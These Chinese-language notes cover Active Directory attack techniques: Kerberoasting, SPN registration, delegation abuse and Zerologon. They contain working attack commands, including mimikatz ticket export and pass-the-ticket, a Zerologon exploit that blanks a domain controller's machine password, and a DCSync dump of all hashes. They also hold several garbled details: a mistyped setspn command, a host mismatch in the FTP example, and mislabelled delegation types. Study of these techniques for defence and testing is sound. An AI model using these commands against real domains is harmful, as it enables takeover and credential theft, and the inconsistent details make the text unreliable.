kerberoasting 攻击

Kerberoasting 攻击是一种针对 Kerberos 认证协议的攻击技术，它允许攻击者请求并获取具有已注册服务主体名称（SPN）的服务的服务票证（ST），然后尝试破解这些票证以获取服务帐户的密码。
ST 中 ticket-enc-part 的加密值使用服务端 hash 加密，默认加密算法使用AES256，但是不是必选项，可以选用 RC4-HMAC-MD5,也就是用户 hash 加密。那么我们将这段加密的内容解密就能得到 server_hash。

SPN

服务主体名称（Service Principal Names，简称 SPN）是服务实例的唯一标识符。

SPN 在 Windows 域环境中，特别是在使用 Kerberos 身份验证协议时，起着至关重要的作用。它用于将服务实例与其登录账户相关联，从而确保客户端能够准确地识别并验证所请求的服务。

SPN 通常包含以下元素：
• 服务类：标识服务的类型，如 HTTP、SMB、MySQL 等。
• 主机名：服务所在的主机名，可以是完全限定的域名（FQDN）或 NetBIOS名。
• 端口号：服务监听的端口号，如果服务运行在默认端口上，则端口号可以省略。
• 服务名称（可选）：额外的服务标识信息。

SPN 注册

注册的用户类型可分为域用户和机器用户，每个服务可以根据其运行的账户类型选择不同的 SPN 注册方式。
（1）机器账户（Computers）注册：服务权限通常是 Local System 或者 Network Service,例如 HOST 服务。
（2）域用户账户（Users）注册：注册在一个域用户权限下使用域用户执行 set spn -Q */*可查询 SPN，下图是由机器账户注册的 SPN：


注册 SPN 的方式一般有两种:
• 系统自动注册，例如默认安装 MSSQL 服务、Exchange 邮箱
• 使用域管理员账号手动注册
默认情况下普通用户是没有权限注册的。

使用域内 administrator 账户将 ls-pc.gouzi.com 下的 WEB 服务注册在 dadmin 用户下：setspn -U -S WEB/ls-pc.gouzi.com dadmin

使用域内 administrator 账户将 ls-pc.gouzi.com 下的 FTP 服务注册在 ls-pc 机器中：setspn -U -S FTP/ad1.deyu.com:9999 ad1

如果当前电脑不在域内，可以使用域内用户枚举和密码喷洒攻击获取一个域账号密码，然后使用 ADfind 工具进行查询。(要有域账户，能跟域内通信)

委派攻击

当用户需要访问某个服务时，如果该服务配置了委派属性，那么服务账户可以代表用户向目标服务发起请求，而无需用户直接提供凭据。通过委派，管理员可以灵活地配置服务账户对不同服务的访问权限，从而实现对服务访问权限的精细化管理。
可理解为：电脑B拿着A的TGT,以A的身份买一张B去C的票据ST2

查询域内设置了非约束委派的服务账户:
AdFind -b “DC=gouzi,DC=com” -f “(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))” dn
查询域内设置了非约束委派的机器账户:
AdFind.exe -b “DC=gouzi,DC=com” -f “(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))” dn

DC默认为非约束性委派机器
分类（及开始版本）：约束性委派-2000，非约束委派-2003，基于资源的非约束委派-2012

使用域控管理员 shell 连接到非约束委派机器
net use \ls-pc.deyu.com\ipc$
使用 mimikatz 导出内存中的 TGT 票据，然后 PTT 注入内存
mimikatz “privilege::debug” “sekurlsa::tickets /export”shell mimi.exe “kerberos::ptt xxx@krbtgt-deyu.COM.kirbi“ “exit”

约束性委派

由于非约束委派的不安全性以及应用场景单一的问题，微软在 windows server
2003 中引入了约束委派，对 Kerberos 协议进行了拓展，引入了 Service for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。非约束委派的设置也可以是机器用户或者注册了 SPN 的域用户。
引入了 S4U 协议之后，用户甚至可以不在内网完成委派请求。例如可以借助 S4U协议对域内边界机器进行 WEB 认证，认证通过之后通过该机器当成自己的代理人完成委派服务。

· 知道被委派的服务

关键就在于被委派的机器被委派了什么服务，假如被委派了 CIFS 服务，就可以使用 psexec 的方式上线。

zerologon

zerologon 漏洞利用了 Netlogon 远程协议（MS-NRPC）中的身份验证绕过机制。
Netlogon 是一个远程过程调用（RPC）接口，Windows 使用它来对基于域的网络上的用户和计算机进行身份验证。该漏洞影响了 MS-NRPC 所使用的 AES-CFB8 加密身份验证方案。在通过 NetLogon 协议与 AD 域控建立安全通道时，如果强行登录尝试并对全零的纯文本应用 AES-CFB8 加密，将导致全零的密文，从而可以绕过正常认证，进一步获取域管理员的 HASH，并获取域管理员权限。

新版 mimikatz 自带这个漏洞的检测，如果执行结果为 Authentication: OK –
vulnerable 则表示漏洞存在。检测命令：
mimikatz “privilege::debug” “lsadump::zerologon /target:192.168.121.77 /account:WIN-HTPPB3UEPF6$”
先置空机器账户的密码：
mimikatz.exe “lsadump::zerologon /target:192.168.121.77 /ntlm /null /account:WIN-HTPPB3UEPF6$ /exploit” “exit”

dcsync：
mimikatz lsadump::dcsync /domain:deyu.com /authuser:WIN-HTPPB3UEPF6$ /authpassword:”” /authntlm /all /csv
